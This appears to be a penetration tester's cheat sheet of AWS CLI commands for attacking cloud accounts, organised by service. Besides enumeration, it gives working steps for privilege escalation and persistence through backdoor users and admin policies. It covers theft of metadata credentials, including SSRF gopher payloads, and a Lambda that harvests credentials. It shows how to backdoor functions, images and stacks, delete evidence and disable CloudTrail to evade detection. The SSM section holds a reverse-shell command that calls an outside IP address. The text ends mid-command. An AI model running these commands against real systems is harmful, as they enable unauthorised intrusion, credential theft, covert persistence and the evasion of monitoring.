# AWS CLI Commands for Penetration Testing

**AWS CLI Commands for Penetration Testing**

Here's a comprehensive list of AWS CLI commands organized by service for penetration testing. Each section includes the command and a brief description of what it does.

# IAM (Identity and Access Management)

### Configuring the AWS cli with a profile

```bash
# basic aws configuration
aws configure --profile <profile_name>

# Add the retrieved keys, access key and secret key
# Once we have a user/role session we can configure the session token
aws configure --profile <new_profile_set>  set aws_session_token="TOKEN_HERE"
```

### User Enumeration

```bash
# List all IAM users
aws iam list-users

# Get details for specific user
aws iam get-user --user-name TARGET_USER

# List access keys for a user
aws iam list-access-keys --user-name TARGET_USER

# Check when an access key was last used
aws iam get-access-key-last-used --access-key-id ACCESS_KEY_ID

# List groups
aws iam list-groups

# List users in a group
aws iam get-group --group-name GROUP_NAME

# get the account id with using the access key - need to have an authenticated AWS acc, not necessarily for that specific tenant
aws sts get-access-key-info --access-key-id <key_id>
```

### Maintain persistence

```bash
# generate new access keys for a user to maintain persistence
aws iam create-access-key --user-name <user_name>

# another way is if you can modify a role's trust policy <UpdateAssumeRolePolicy> then we can maintain access with updating the trust role for the policy
aws iam update-assume-role-policy --role-name <rolename> --policy-document file://attacker-trust-policy.json

# attach a policy to a role, see below for the example for full priv
aws iam put-role-policy --role-name <role_name> --policy-name <FULL_ACCESS_POLICY> --policy-doument file://new_role_policy.json
```

Example policy for the above persistence/privesc if we can modify the trust role policy

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": [
          "arn:aws:iam::<account-id>:user/helly",
          "arn:aws:iam::<account-id>:user/attacker"
        ]
      },
      "Action": "sts:AssumeRole"
    }
  ]
}

```

Example policy to have full access privileges to everything

```bash
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action":"*",
      "Resource":"*"
    }
  ]
}
```

### Role Enumeration

```bash
# List all IAM roles
aws iam list-roles

# Get details for specific role
aws iam get-role --role-name ROLE_NAME

# List all roles that can be assumed by the current identity
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS=="CURRENT_ARN"]]'

# list paths and unique roles
aws iam list-roles --query 'Roles[]' --profile bucket | sort | uniq

# List paths and unique roles
aws iam list-roles --query "Roles[].Path" --profile <profile> | sort | uniq

# get the arn for the role
aws iam list-roles --query 'Roles[].Arn' --profile <profile> | sort | uniq

# get the total of the roles
aws iam list-roles --query "length(Roles)" --profile <profile>

# list roles with some enhanced parsing
aws iam list-roles --query "Roles[].Path" --profile bucket | sort | uniq | sed -E 's/"\/([^"]*)\/?",?/\1/g'

# super clean output for the path
aws iam list-roles --query "Roles[].Path" --profile bucket | sort | uniq | sed -E 's/"\/([^"]*)\/?",?/\1/g' | sed '/^\s*\[\s*$/d' | sed '/^\s*\]\s*$/d'

# super clean output for the arn 
aws iam list-roles --query "Roles[].Path" --profile bucket | sort | uniq | sed -E 's/"\/([^"]*)\/?",?/\1/g' | sed '/^\s*\[\s*$/d' | sed '/^\s*\]\s*$/d'

# check permissions with policy simulation
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123456789012:role/MyRedTeamRole --action-names ec2:ModifyInstanceMetadataOptions --resource-arns arn:aws:ec2:us-east-1:123456789012:instance/* --output table

# check if one role can assume another role
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::111122223333:role/MyRedTeamRole \
  --action-names sts:AssumeRole \
  --resource-arns arn:aws:iam::999988887777:role/TargetRole \
  --output table
  

# check for roles we can assume
echo "Listing IAM roles..."
aws --profile metrics iam list-roles > roles.json || { echo "Failed to list roles"; exit 1; }

for ROLE_ARN in $(jq -r '.Roles[].Arn' roles.json); do
  echo "Trying to assume role: $ROLE_ARN"
  aws --profile metrics sts assume-role \
    --role-arn "$ROLE_ARN" \
    --role-session-name RoleChainingSession || \
  echo "Failed to assume role: $ROLE_ARN"
done

```

### Policy Enumeration

```bash
# List all customer managed policies
aws iam list-policies --scope Local

# List AWS managed policies
aws iam list-policies --scope AWS

# Get policy details for AWS managed policies
aws iam get-policy --policy-arn POLICY_ARN

# Get and list all policy version details (the actual policy document) for customer managed policies
aws iam list-policy-versions --policy-arn POLICY_ARN --profile <profile>

# get the specific or probably last version for that policy
aws iam get-policy-version --policy-arn POLICY_ARN --version-id VERSION_ID

# List policies attached to a user (**AWS and customer managed policies!**)
aws iam list-attached-user-policies --user-name USER_NAME

# list **inline policies** for a user
aws iam list-user-policies --user-name USER_NAME

# get the inline policy for a user
aws iam get-user-policy --user-name <username> --policy-name <policy_name>

# List policies attached to a role **AWS and customer managed policies!**
aws iam list-attached-role-policies --role-name ROLE_NAME

# inline role policies
aws iam list-role-policies --role-name ROLE_NAME

aws iam get-role-policy --role-name <role_name> --policy-name <policy_name> --profile <profile>

# list policy version
aws iam list-policy-versions --policy-arn <identity.arn> --profile <profile>

# get policy version
aws iam get-policy-version --policy-arn <identity.arn> --version-id v1 --profile <profile>

```

### Privilege Escalation

```bash
# Create a new access key for privilege escalation
aws iam create-access-key --user-name TARGET_USER

# Attach admin policy to user
aws iam attach-user-policy --user-name TARGET_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create policy version with admin privileges (for policy you can update)
aws iam create-policy-version --policy-arn TARGET_POLICY_ARN --policy-document file://admin-policy.json --set-as-default

# put a policy onto a role
aws iam put-role-policy --role-name <role_name> --policy-name <FULL_ACCESS_POLICY> --policy-doument file://new_role_policy.json

# Create a new user with admin access
aws iam create-user --user-name BACKDOOR_USER
aws iam create-access-key --user-name BACKDOOR_USER
aws iam attach-user-policy --user-name BACKDOOR_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Assume role (horizontal/vertical movement)
aws sts assume-role --role-arn ROLE_ARN --role-session-name PENETRATION_TEST

```

### Permission Testing

```bash
# Test what actions your current identity can perform
aws iam simulate-principal-policy --policy-source-arn $(aws sts get-caller-identity --query 'Arn' --profile <profile> --output text) --profile <profile_again> --action-names iam:CreateUser s3:ListAllMyBuckets ec2:DescribeInstances

# Check if specific user can perform actions
aws iam simulate-principal-policy --policy-source-arn USER_ARN --action-names iam:CreateUser lambda:CreateFunction

# This command retrieves information about all IAM users, groups, roles, and policies in your AWS account, including their relationships to one another
aws iam get-account-authorization-details 

# list last accessed services by a user
aws iam generate-service-last-accessed-details --arn arn:aws:iam::741448947753:user/backup

# access for a job id 
aws iam get-service-last-accessed-details --job-id fac9de19-7ee7-39ed-3e56-5b7940670801

# simulate principal policy
aws iam simulate-principal-policy   --policy-source-arn arn:aws:iam::<acc_id>:user/<username> --action-names ec2:ModifyInstanceMetadataOptions --resource-arns arn:aws:ec2:us-east-1:<acc_id>:instance/*  --output table --profile <profile>

```

# S3 enumeration

### List buckets (can also use it with `--no-sign-request`)

```bash
# basic usage
aws s3 ls s3://bucket/ --recursive --profile <profile>

# List buckets
aws s3 ls

# List objects in bucket
aws s3 ls s3://BUCKET_NAME

# List bucket details
aws s3api list-objects-v2 --bucket BUCKET_NAME

# Check bucket policy
aws s3api get-bucket-policy --bucket BUCKET_NAME

# Check bucket ACL
aws s3api get-bucket-acl --bucket BUCKET_NAME

# Check bucket encryption
aws s3api get-bucket-encryption --bucket BUCKET_NAME

# Check for public access
aws s3api get-public-access-block --bucket BUCKET_NAME

# Find sensitive files
aws s3 ls s3://BUCKET_NAME --recursive | grep -E "password|credential|secret|key|token"

# set the local variables and then use curl and the api for s3 buckets
export AWS_ACCESS_KEY='AWS_ACCESS_KEY'
export AWS_SECRET_ACCESS_KEY='SECRET_ACCESS_KEY'
curl --silent --aws-sigv4 "aws:amz:us-west-2:s3" --user "$AWS_ACCESS_KEY:$AWS_SECRET_KEY" "https://s3.us-west-2.amazonaws.com" | xmllint --format

# experimental regex - taken from git-secrets
aws s3 ls s3://BUCKET_NAME --recursive | grep -E "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA|APKA|ASCA)[A-Z0-9]{16}|(\"|')?(AWS|aws|Aws)?_?(SECRET|secret|Secret)?_?(ACCESS|access|Access)?_?(KEY|key|Key)(\"|')?\\s*(:|=>|=)\\s*(\"|')?[A-Za-z0-9/\\+=]{40}(\"|')?|(\"|')?(AWS|aws|Aws)?_?(ACCOUNT|account|Account)_?(ID|id|Id)?(\"|')?\\s*(:|=>|=)\\s*(\"|')?[0-9]{4}\\-?[0-9]{4}\\-?[0-9]{4}(\"|')?|password|credential|secret|key|token"

# use curl to identify the region for the bucket, get the http headers
curl -I https://bucket-name.s3.amazonaws.com 

# list bucket policies
aws s3api get-bucket-policy --bucket <bucket_name> --no-sign-request

# get the versions for the objects inside of the bucket
aws s3api list-object-versions --bucket <bucket_name> --no-sign-request

# get the object with a specific version
aws s3api get-object --bucket <bucket_name> --key <dir/file.format> --version-id <versionID> <filename.ext> --no-sign-request

# list object versions
aws s3api list-object-versions --bucket <bucket_name> --no-sign-request

# get the deleted objects with their versions with querying the deletemarkers
aws s3api list-object-versions --bucket aws-monitoring-bucket --no-sign-request --query 'DeleteMarkers[*]'

# nicer output with jq
aws s3api list-object-versions --bucket <bucket_name> --no-sign-request --query 'Versions[*].{Key:Key,VersionId:VersionId}' --output json | jq -r '.[]'

# check the deleted files 
aws s3api list-object-versions --bucket <bucket_name> --no-sign-request   --query 'DeleteMarkers[*].{Key:Key,VersionId:VersionId}' --output json | jq -r '.[]'

```

### Bucket Enumeration

```bash
# List all S3 buckets
aws s3 ls

# List objects in a bucket
aws s3 ls s3://BUCKET_NAME --recursive

# Check bucket policy
aws s3api get-bucket-policy --bucket BUCKET_NAME

# Check bucket ACL
aws s3api get-bucket-acl --bucket BUCKET_NAME

# Check bucket encryption settings
aws s3api get-bucket-encryption --bucket BUCKET_NAME

```

### Bucket Exploitation

```bash
# Download entire bucket
aws s3 sync s3://BUCKET_NAME/ ./downloaded-bucket/

# Upload backdoor file
aws s3 cp ./backdoor.php s3://BUCKET_NAME/

# Make bucket public
aws s3api put-bucket-acl --bucket BUCKET_NAME --acl public-read

# Make specific object public
aws s3api put-object-acl --bucket BUCKET_NAME --key FILE_NAME --acl public-read

# Search for sensitive files
aws s3 ls s3://BUCKET_NAME/ --recursive | grep -E "password|credential|config|secret|key|token"

```

### Sending Direct API Calls – ListAllMyBuckets

```powershell
# to use with valid access key and secret set
curl --silent --aws-sigv4 "aws:amz:us-west-2:s3" --user
"$AWS_ACCESS_KEY:$AWS_SECRET_KEY" "https://s3.us-west2.amazonaws.com" | xmllint --format
```

# EC2 (Elastic Compute Cloud)

### Simple Metadata query v1

```python
# On the EC2 instance, retrieve role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get specific role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME/USERNAME
```

### IMDSV2 metadata query

```python
# get a token for the session
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# check the token
echo $TOKEN

# access metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security/credentials/<RoleName>

# all in one command
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# check any users/roles and their creds checking in /iam/info/
# to get the actual credentials check /iam/security-credentials/<RoleName/UserName>
# can find more relevant information on /latests/dynamic/instance-identity/document with v1 and curling from the ec2 instance

# using gopher in case the protocol is enabled
gopher://169.254.169.254:80/_PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

gopher://169.254.169.254:80/_PUT%20%2Flatest%2Fapi%2Ftoken
%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0AX-aws-ec2-
metadata-token-ttl-seconds:%2021600%0D%0A

# using the token
gopher://169.254.169.254:80/_GET /latest/meta-data/iam/security-credentials/<some_role> HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQyXn79CKSb0bK9oStmcyCAVsF8upfbq264-RAVEDYUm6zbdwm==

# url encoded
gopher%3A%2F%2F169.254.169.254%3A80%2F_GET%2520%252Flatest%252Fmeta-data%252Fiam%252Fsecurity-credentials%252Fapi_role%2520HTTP%2F1.1%250d%250aHost%3A%2520169.254.169.254%250d%250aX-aws-ec2-metadata-token%3A%2520AQyXn79CKSb0bK9oStmcyCAVsF8upfbq264-RAVEDYUm6zbdwm%250d%250a
 

```

NOTE: if possible, since GuardDuty will send alerts that creds are being used outside of the instance, try to use them within the instance itself to have a more stealth approach/access to further enumeration and checks.

```bash
# On the EC2 instance, retrieve role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get specific role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Use these credentials with the AWS CLI by setting environment variables
export AWS_ACCESS_KEY_ID=RETRIEVED_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=RETRIEVED_SECRET_KEY
export AWS_SESSION_TOKEN=RETRIEVED_SESSION_TOKEN

```

### Instance Enumeration

```bash
# List all EC2 instances
aws ec2 describe-instances

# List running instances
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running"

# List instances with public IPs
aws ec2 describe-instances --query 'Reservations[*].Instances[?PublicIpAddress!=`null`].[InstanceId,PublicIpAddress,PrivateIpAddress,State.Name,SecurityGroups[0].GroupId]'

# user data from instance
aws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData

# Get user data (might contain secrets) + decode 
aws ec2 describe-instance-attribute --instance-id INSTANCE_ID --attribute userData --output text --query 'UserData.Value' | base64 --decode -w0

# enumerate ec2 instances and have the output into a table format
aws ec2 describe-instances  --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,Tags[?Key==`Name`]| [0].Value]' --output table

# describe launch templates
aws ec2 describe-launch-templates --region us-west-2 --profile <profile>

# get the launch template versions
aws ec2 describe-launch-template-versions --region us-west-2 --launch-template-id lt-00749b8fea61248ca --versions $Latest

aws ec2 describe-launch-template-versions --region us-west-2 --launch-template-id lt-00749b8fea61248ca --versions $Latest --query "LaunchTemplateVersions[0].LaunchTemplateData.UserData" --profile new --output text --profile <profile> | base64 -d

```

### Security Group Enumeration

```bash
# List all security groups
aws ec2 describe-security-groups

# Find security groups allowing SSH from anywhere
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?ToPort==`22` && contains(IpRanges[].CidrIp, `0.0.0.0/0`)]].{Name:GroupName,ID:GroupId}'

# Find security groups allowing RDP from anywhere
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?ToPort==`3389` && contains(IpRanges[].CidrIp, `0.0.0.0/0`)]].{Name:GroupName,ID:GroupId}'

# Find security groups allowing ALL traffic
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpProtocol==`-1` && contains(IpRanges[].CidrIp, `0.0.0.0/0`)]].{Name:GroupName,ID:GroupId}'

# get the ec2 inrgess rules from the security group
aws ec2 describe-security-groups --query 'SecurityGroups[*].{ID:GroupId,Ingress:IpPermissions}' --output text --profile <profile_name>

```

### Instance Exploitation

```bash
# Create a backdoor instance
aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --key-name YOUR_KEY --security-group-ids sg-12345678

# Create an instance with admin role
aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Name=ADMIN_PROFILE --key-name YOUR_KEY

# Modify instance metadata options (secure instances use IMDSv2)
aws ec2 modify-instance-metadata-options --instance-id INSTANCE_ID --http-tokens required --http-endpoint enabled

# possible downgrade from version2 to v1, must have the permission ec2:ModifyInstanceMetadataOptions enabled
aws ec2 modify-instance-metadata-options --instance-id <instance_id> --http-tokens optional --http-endpoint enabled

# disable IMDS
aws ec2 modify-instance-metadata-options --instance-id <instance_id> --http-endpoint disabled
```

### EBS Volume Exploitation

```bash
# List unencrypted EBS volumes
aws ec2 describe-volumes --query 'Volumes[?Encrypted==`false`]'

# List available (detached) volumes
aws ec2 describe-volumes --filters Name=status,Values=available --query 'Volumes[?Encrypted==`false`]'

# Create a volume from snapshot (may contain data)
aws ec2 create-volume --availability-zone ZONE --snapshot-id snap-12345678

# Attach a volume to your instance for data extraction
aws ec2 attach-volume --volume-id vol-12345678 --instance-id i-12345678 --device /dev/xvdf

```

## EBS Snapshots Download and Exploitation

```bash
# we can also use dsnap to download a public snapshot and then mount it locally or on an ec2 instance

# list public snapshots using associated with an account ID
aws ec2 describe-snapshots --owner-ids <account_ID> --region <region_here>
```

# Lambda

### Function Enumeration

```bash
# List all Lambda functions
aws lambda list-functions

# check for roles associated running 
aws lambda list-functions --query 'Functions[].{Name:FunctionName, Role:Role}' --output table --profile <profile>

#single function check for role
aws lambda get-function-configuration --function-name yourFunctionName --query 'Role' --output text --profile <profile>

# Get function configuration (may expose environment variables)
aws lambda get-function-configuration --function-name FUNCTION_NAME

# get the lambda function
aws lambda get-function --function-name <function_name> --profile <profile_name>

# Get function code location
aws lambda get-function --function-name FUNCTION_NAME --query 'Code.Location'

# List function policies (who can invoke it)
aws lambda get-policy --function-name FUNCTION_NAME

# invoke lambda function - This creates the a file locally named outfile that contains the results of the function execution.
aws lambda invoke --function-name <name> outfile --profile <profile>

```

### Function Exploitation

```bash
# Create a backdoor Lambda function
aws lambda create-function --function-name backdoor-function --runtime python3.9 --role ROLE_ARN --handler lambda_function.lambda_handler --zip-file fileb://backdoor.zip

# Update existing Lambda with backdoor code, you can use the example below to create a simple lambda function
aws lambda update-function-code --function-name TARGET_FUNCTION --zip-file fileb://backdoor.zip

# Add trigger to Lambda (e.g., schedule)
aws events put-rule --name daily-trigger --schedule-expression "rate(1 day)"
aws lambda add-permission --function-name backdoor-function --statement-id daily-trigger --action lambda:InvokeFunction --principal events.amazonaws.com --source-arn RULE_ARN

# Invoke function
aws lambda invoke --function-name FUNCTION_NAME --payload '{}' response.json

```

### lambda function example code for creds pillaging for a role/user that can up date lambda functions

```bash
# lets say we called the file lambda_function.py
import boto3
import json

def lambda_handler(event, context):
    credentials = boto3.Session().get_credentials()
    return {
        "statusCode": 200,
        "body": json.dumps({
            "AccessKeyId": credentials.access_key,
            "SecretAccessKey": credentials.secret_key,
            "SessionToken": credentials.token,
        })
    }

# next we zip the function
zip lambda_function.py

# update the code function of an existing one, basically overwriting it
aws lambda update-function-code --function-name TARGET_FUNCTION --zip-file fileb://backdoor.zip --profile <profile_name>

# invoke the function
aws lambda invoke --function-name <TARGET_FUNCTION> <outputfilename>.txt --profile <profile_name>

# extract with a readable format
cat outputfile.txt | jq -r '.body | fromjson | "AWS_ACCESS_KEY_ID=\(.AccessKeyId)\nAWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)\nAWS_SESSION_TOKEN=\(.SessionToken)"'

```

# CodeBuild

```bash
# list projects
aws codebuild --list-projects --profile <profile>

#
aws codebuild batch-get-projects -names <project_name> --profile <profile>

```

# RDS (Relational Database Service)

### Database Enumeration

```bash
# List all RDS instances
aws rds describe-db-instances

# Find publicly accessible databases
aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`]'

# List database snapshots
aws rds describe-db-snapshots

# List publicly accessible snapshots
aws rds describe-db-snapshots --query 'DBSnapshots[?contains(AttributeNames, `restore`)]'

```

### Database Exploitation

```bash
# Create a new DB instance from a snapshot (to access data)
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier new-instance --db-snapshot-identifier SNAPSHOT_ID --publicly-accessible

# Modify security group for a database (to allow access)
aws rds modify-db-instance --db-instance-identifier INSTANCE_ID --vpc-security-group-ids SECURITY_GROUP_ID

# Export snapshot to S3 (for data exfiltration)
aws rds start-export-task --export-task-identifier export-task --source-arn SNAPSHOT_ARN --s3-bucket-name TARGET_BUCKET --iam-role-arn ROLE_ARN

```

# DynamoDB

### Table Enumeration

```bash
# List all DynamoDB tables
aws dynamodb list-tables

# Describe table structure
aws dynamodb describe-table --table-name TABLE_NAME

# Scan table (get all data)
aws dynamodb scan --table-name TABLE_NAME

# Get specific item
aws dynamodb get-item --table-name TABLE_NAME --key '{"PrimaryKey":{"S":"Value"}}'

```

### Table Exploitation

```bash
# Extract all data from a table
[AWS reference](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/scan.html)
aws dynamodb scan --table-name TABLE_NAME > table_data.json

# Insert backdoor item
aws dynamodb put-item --table-name TABLE_NAME --item '{"PrimaryKey":{"S":"backdoor"},"data":{"S":"payload"}}'

# Delete evidence
aws dynamodb delete-item --table-name TABLE_NAME --key '{"PrimaryKey":{"S":"evidence"}}'

```

# Secrets Manager and SSM

### Secrets Enumeration

```bash
# List all secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id SECRET_ID

# List SSM parameters
aws ssm describe-parameters

# Get parameter value (including encrypted parameters)
aws ssm get-parameter --name PARAMETER_NAME --with-decryption

# get the ssm content
aws secretsmanager get-secret-value --secret-id root_account_e206c49bdf3d --profile <profile> --region us-west-2

# to decrypt the secret
aws  ssm get-parameter --with-decryption --name /application/wprod3/admin --profile <profile> --region us-west-2

# send command with ssm
aws ssm send-command \
  --instance-ids i-008087308a5da776c \
  --document-name "AWS-RunShellScript" \
  --parameters commands='netstat -tulpn | grep LISTEN' \
  --region us-west-2 \
  --profile new

```

### Secrets Exploitation

```bash
# Create a backdoor secret
aws secretsmanager create-secret --name backdoor-secret --secret-string '{"username":"backdoor","password":"password123"}'

# Update existing secret
aws secretsmanager update-secret --secret-id TARGET_SECRET --secret-string '{"username":"original","password":"compromised"}'

```

## SSM commands

```bash
# List SSM parameters
aws ssm describe-parameters

# Get parameter value (including encrypted parameters)
aws ssm get-parameter --name PARAMETER_NAME --with-decryption

# to decrypt the secret
aws  ssm get-parameter --with-decryption --name /application/wprod3/admin --profile <profile> --region us-west-2

# send command with ssm
aws ssm send-command \
  --instance-ids i-008087308a5da776c \
  --document-name "AWS-RunShellScript" \
  --parameters commands='netstat -tulpn | grep LISTEN' \
  --region us-west-2 \
  --profile new

# lateral movement to an ec2 instance controlled by ssm
aws ssm send-command --document-name "AWS-RunShellScript" --targets
"Key=instanceIds,Values=i-0a3bb88ef2d7a8d44" --comment "Update the instance" --parameters
'commands=["bash -i >/dev/tcp/52.26.44.253/8080 0<&1 2>&1"]' --region us-west-2
```

# CloudTrail

### Trail Enumeration

```bash
# List all CloudTrail trails
aws cloudtrail describe-trails

# Check if trail logging is enabled
aws cloudtrail get-trail-status --name TRAIL_NAME

# List S3 buckets storing CloudTrail logs
aws cloudtrail describe-trails --query 'trailList[*].S3BucketName'

# list trails for a specific time period example
aws cloudtrail lookup-events --start-time 2025-03-21T00:00:00Z --end-time 2025-03-28T23:59:59Z --profile <profilename> --region <region>

# describe trails using query option
aws cloudtrail describe-trails --query 'trailList[?IsMultiRegionTrail==`false`]'

```

### Trail Evasion (High Risk)

```bash
# Disable CloudTrail (highly detectable)
aws cloudtrail stop-logging --name TRAIL_NAME

# Delete a trail (extremely suspicious)
aws cloudtrail delete-trail --name TRAIL_NAME

```

### Unzip/gunzip all the logs in the dir

```bash
find . -type f -exec gunzip {} \;
```

# API Gateway

### API Enumeration

```bash
# List all REST APIs
aws apigateway get-rest-apis

# Get API stages
aws apigateway get-stages --rest-api-id API_ID

# Get API resources (endpoints)
aws apigateway get-resources --rest-api-id API_ID

# List HTTP APIs (API Gateway v2)
aws apigatewayv2 get-apis

```

### API Exploitation

```bash
# Get API key (if used for authentication)
aws apigateway get-api-keys

# Create a resource on an API (if authorized)
aws apigateway create-resource --rest-api-id API_ID --parent-id PARENT_ID --path-part backdoor

```

# STS (Security Token Service)

### STS Commands

```bash
# Get current identity
aws sts get-caller-identity

# Assume role (for privilege escalation or lateral movement)
aws sts assume-role --role-arn ROLE_ARN --role-session-name pentest-session

# Get session token with MFA
aws sts get-session-token --serial-number MFA_SERIAL --token-code MFA_CODE

```

# Cognito (use pacu iam__buteforce_permissions)

```bash
# list identity pools 
	aws cognito-identity list-identity-pools --max-results 10  --profile <profile>

# command
aws cognito-identity describe-identity-pool --identity-pool-id "us-west-2:f41c13c9-f24b-4f84-bfcc-33ad66580476" --profile test --region us-west-2

# get role associated with the identity pool
aws cognito-identity get-identity-pool-roles --identity-pool-id "us-west-2:f41c13c9-f24b-4f84-bfcc-33ad66580476" --profile test --region us-west-2

# get the indetity id
aws cognito-identity get-id --identity-pool-id us-west-2:f41c13c9f24b-4f84-bfcc-33ad66580476 --profile test --region us-west-2

# get the open id token
aws cognito-identity get-open-id-token --identity-id "us-west-2:aca1cd18-295e-cae8-ae81-e44c68fdfc8c" --profile test --region us-west-2

# assume the role
sts assume-role-with-web-identity --role-arn arn:aws:iam::741448947753:role/service-role/skyward-app-role --role-session-name anonymous-session --web-identity-token

# using pacu to enumerate cognito
run iam__bruteforce_permissions 

```

# KMS (Key Management Service)

### Key Enumeration

```bash
# List all KMS keys
aws kms list-keys

# Describe a key
aws kms describe-key --key-id KEY_ID

# List aliases (friendly names) for keys
aws kms list-aliases

```

### Key Exploitation

```bash
# Create a new key (if authorized)
aws kms create-key --description "Backdoor key"

# Decrypt data if authorized
aws kms decrypt --ciphertext-blob fileb://encrypted-data --output text --query Plaintext | base64 --decode

```

# Appcofig

AppConfig  feature  flags  and  dynamic  configurations  help  software builders quickly and securely adjust application behavior in production environments  without  full code deployments. AppConfig speeds up soft-ware release frequency, improves application resiliency, and helps you address emergent issues more quickly.

```bash
# list applications in appconfig
aws appconfig list-applications --region us-west-2 --profile <profile>

# list environments
aws appconfig list-environments --application-id mczjetm --region us-west-2 --profile <profile>

# list config profiles (call the Application ID from output)
aws appconfig list-configuration-profiles --application-id mczjetm --region us-west-2 --profile <profile>

# 
aws appconfig list-hosted-configuration-versions --application-id mczjetm --configuration-profile-id 1odtsfh --region us-west-2 --profile <profile>

# 
aws appconfig get-hosted-configuration-version --application-id mczjetm --configuration-profile-id 1odtsfh --version-number 1 --region us-west-2 --profile <profile> outfile

```

# ECR (Elastic Container Registry)

### Repository Enumeration

```bash
# List all repositories
aws ecr describe-repositories --region <region>

# List images in a repository
aws ecr describe-images --repository-name REPO_NAME

# Get repository policy
aws ecr get-repository-policy --repository-name REPO_NAME

```

### Repository Exploitation

```bash
# Push a backdoored container image
aws ecr get-login-password | docker login --username AWS --password-stdin AWS_ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com

docker push AWS_ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/REPO_NAME:TAG

# get the docker image locally
docker pull AWS_ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/REPO_NAME:TAG

# example to run commands from the acquired container image 
docker run -it --name=<REPO_NAME> <AWS_ACCOUNT_ID>.dkr.ecr.<REGION>.amazonaws.com/<repo_name> /bin/bash

```

# CloudFormation

### Stack Enumeration

```bash
# List all stacks
aws cloudformation list-stacks

# Describe stack resources
aws cloudformation describe-stack-resources --stack-name STACK_NAME

# Get stack template
aws cloudformation get-template --stack-name STACK_NAME

```

### Stack Exploitation

```bash
# Create a new stack with backdoor resources
aws cloudformation create-stack --stack-name backdoor-stack --template-body file://backdoor-template.json --capabilities CAPABILITY_NAMED_IAM

# Update an existing stack with modified template
aws cloudformation update-stack --stack-name TARGET_STACK --template-body file://modified-template.json --capabilities CAPABILITY_NAMED_IAM

```

# VPC and Networking

### Network Enumeration

```bash
# List all VPCs
aws ec2 describe-vpcs

# List subnets
aws ec2 describe-subnets

# List network ACLs
aws ec2 describe-network-acls

# List route tables
aws ec2 describe-route-tables

# Find internet gateways
aws ec2 describe-internet-gateways

```

### Network Exploitation

```bash
# Modify security group to allow access
aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 0.0.0.0/0

# Create permissive network ACL rule
aws ec2 create-network-acl-entry --network-acl-id acl-12345678 --rule-number 100 --protocol -1 --rule-action allow --egress false --cidr-block 0.0.0.0/0

```

# ElasticBeankstalk

https://github.com/aws/aws-elastic-beanstalk-cli-setup

```bash
curl -X POST http://hl-app-env.eba-shh7rg7f.us-west-
2.elasticbeanstalk.com/execute -H "Content-Type: application/json" -d
'{"command": "id"}'
```

## aws-cli for beanstalk enum

```bash
aws s3 ls elasticbeanstalk-us-east-1-243918968627 –recursive

aws s3 cp s3://elasticbeanstalk-us-east-1-243918968627/HL-APP/app-241213_003715342215.zip .
```

## get token with curl abusing ssrf

```bash

curl -X POST http://hl-app-env.eba-shh7rg7f.us-west-2.elasticbeanstalk.com/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "curl -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\""}'

# use the token to retrieve creds
curl -X POST http://hl-app-env.eba-shh7rg7f.us-west-2.elasticbeanstalk.com/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "curl -H \"X-aws-ec2-metadata-token: AQAEAMO3Ae-_x6X1kxQhoYCCnYKZK1cJJh-uuyFoki1yUaRnHexrDg==\" http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

```

# Tagging services - query all tags with associated services

```bash
# get the tags for the services/resources deployed
aws resourcegroupstaggingapi get-resources --region us-east-1 --profile cli-admin
```

# Get the Windows EC2 admin password from a PEM key

```bash
for id in $(aws ec2 describe-instances --query "Reservations[]*.Instances*[].InstanceId" --output text); do aws ec2 get-password-data --instance-id "$id" --priv-launch-key "vincent_key.pem"; done
```

# IAM Credentials access from Console’s CloudShell

```powershell
# within a console session, from cloudshell run this command to get IAM credentials

TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
